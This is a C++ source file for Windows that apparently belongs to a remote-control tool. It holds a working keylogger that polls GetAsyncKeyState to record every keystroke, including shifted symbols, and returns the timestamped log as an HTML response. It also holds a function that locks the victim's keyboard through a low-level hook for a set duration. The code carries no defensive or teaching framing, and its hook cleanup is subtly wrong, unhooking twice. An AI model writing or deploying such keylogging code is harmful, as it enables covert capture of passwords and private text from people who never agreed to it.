#include "../include/keyboard.h"

string getCurrentTime() {
    auto now = chrono::system_clock::to_time_t(chrono::system_clock::now());

    struct tm local_time;
    localtime_s(&local_time, &now);

    stringstream formatted_time;
    formatted_time << put_time(&local_time, "%d/%m/%Y %H:%M:%S");

    string current_time = formatted_time.str();
    return current_time;
}

map<int, string> spec_key = {
    {VK_CONTROL, l "ctrl" r},
    {VK_SHIFT, l "shift" r},
    {VK_TAB, l "tab" r},
    {VK_ESCAPE, l "esc" r},
    {VK_LWIN, l "left windows" r},
    {VK_RWIN, l "right windows" r},
    {VK_END, l "end" r},
    {VK_DELETE, l "delete" r},
    {VK_F1, l "f1" r}, {VK_F2, l "f2" r}, {VK_F3, l "f3" r}, {VK_F4, l "f4" r},
    {VK_F5, l "f5" r}, {VK_F6, l "f6" r}, {VK_F7, l "f7" r}, {VK_F8, l "f8" r},
    {VK_F9, l "f9" r}, {VK_F10, l "f10" r}, {VK_F11, l "f11" r}, {VK_F12, l "f12" r},
    {VK_INSERT, l "insert" r},
    {VK_DOWN, l "down" r},
    {VK_RIGHT, l "right" r},
    {VK_LEFT, l "left" r},
    {VK_UP, l "up" r},
    {VK_SPACE, "&nbsp;"},
    {VK_BACK, l "backspace" r},
    {VK_RETURN, l "enter" r},
    {VK_MENU, l "alt" r},
    {VK_CAPITAL, l "caps lock" r}
};

string parseKeyEvent(int key) {
    ostringstream res;

    if (spec_key.find(key) != spec_key.end()) {
        res << spec_key[key];
    }

    // check shift status
    bool isShiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;

    // distinguish upper, lower, special
    if (key >= '0' && key <= '9') {
        if (isShiftPressed) {
            const char shiftNumbers[] = { ')', '!', '@', '#', '$', '%', '^', '&', '*', '(' };
            res << shiftNumbers[key - '0'];
        }
        else {
            res << char(key);
        }
    }
    else if (key >= 'A' && key <= 'Z') {
        bool isCapsLock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
        if (isShiftPressed ^ isCapsLock)
            res << char(key);
        else
            res << char(key + 32);
    }
    else {
        // Special char
        switch (key) {
        case VK_OEM_1: res << (isShiftPressed ? ':' : ';'); break;
        case VK_OEM_2: res << (isShiftPressed ? '?' : '/'); break;
        case VK_OEM_3: res << (isShiftPressed ? '~' : '`'); break;
        case VK_OEM_4: res << (isShiftPressed ? '{' : '['); break;
        case VK_OEM_5: res << (isShiftPressed ? '|' : '\\'); break;
        case VK_OEM_6: res << (isShiftPressed ? '}' : ']'); break;
        case VK_OEM_7: res << (isShiftPressed ? '"' : '\''); break;
        case VK_OEM_PLUS: res << (isShiftPressed ? '+' : '='); break;
        case VK_OEM_COMMA: res << (isShiftPressed ? '<' : ','); break;
        case VK_OEM_MINUS: res << (isShiftPressed ? '_' : '-'); break;
        case VK_OEM_PERIOD: res << (isShiftPressed ? '>' : '.'); break;
        default:
            break;
        }
    }

    return res.str();
}

string keyLog(int duration) {
    string logger = "";
    auto start_time = chrono::steady_clock::now();

    while (chrono::duration_cast<chrono::seconds>(chrono::steady_clock::now() - start_time).count() < duration) {
        for (int key = 8; key <= 255; ++key) {
            // Check if the key is currently pressed
            if (GetAsyncKeyState(key) & 0x0001) {
                logger += parseKeyEvent(key);
            }
        }
    }
    return logger;
}

Response getKeyLog(int duration) {
    string current_time = getCurrentTime();

    string logger = keyLog(duration);

    string msg = to_string(duration) + " seconds of key logging (from " + current_time
        + "): <span style=\"font-weight:bold;\">" + logger + "</span>";

    return { html_msg(msg), vector<BYTE>{} };
}

HHOOK hKeyboardHook = NULL; // Keyboard hook handle
bool isKeyboardLocked = false; // Keyboard lock state
atomic<bool> isRunning(true); // Atomic flag for hook thread loop
DWORD hookThreadId; // ID of the hook thread

// Hook procedure: Blocks key events if isKeyboardLocked is true
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && isKeyboardLocked) {
        KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
        // Always allow the ESC key for emergency exit
        if (pKeyboard->vkCode == VK_ESCAPE) {
            return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
        }
        // Block all other keys
        if (wParam == WM_KEYDOWN || wParam == WM_KEYUP) {
            return 1; // Prevent the key from being sent to the system
        }
    }
    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

// Hook thread: Maintains the keyboard hook
void hookThread() {
    // Store the current thread ID
    hookThreadId = GetCurrentThreadId();

    // Install the keyboard hook
    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    if (!hKeyboardHook) {
        cerr << "Failed to install keyboard hook!" << endl;
        return;
    }

    cout << "Keyboard hook installed. Listening for lock commands..." << endl;

    // Keep the hook active with a message loop
    MSG msg;
    while (isRunning && GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Uninstall the hook upon exit
    UnhookWindowsHookEx(hKeyboardHook);
    if (!UnhookWindowsHookEx(hKeyboardHook)) {
        cerr << "Failed to uninstall keyboard hook. Error: " << GetLastError() << endl;
    }

    cout << "Keyboard hook thread exited.\n";
}

Response keyLock(int duration) {
    string current_time = getCurrentTime();

    isRunning = true;
    thread hookWorker(hookThread);
    
    isKeyboardLocked = true;
    cout << "Keyboard is now locked!\n";

    this_thread::sleep_for(chrono::seconds(duration));
    
    isKeyboardLocked = false;
    cout << "Keyboard is now unlocked!\n";

    isRunning = false;
    PostThreadMessage(hookThreadId, WM_QUIT, 0, 0);
    hookWorker.join();

    string msg = "The keyboard was locked for a duration of " + to_string(duration) + " seconds, starting at " + current_time + ".";

    return { html_msg(msg, true, true), vector<BYTE>{} };
}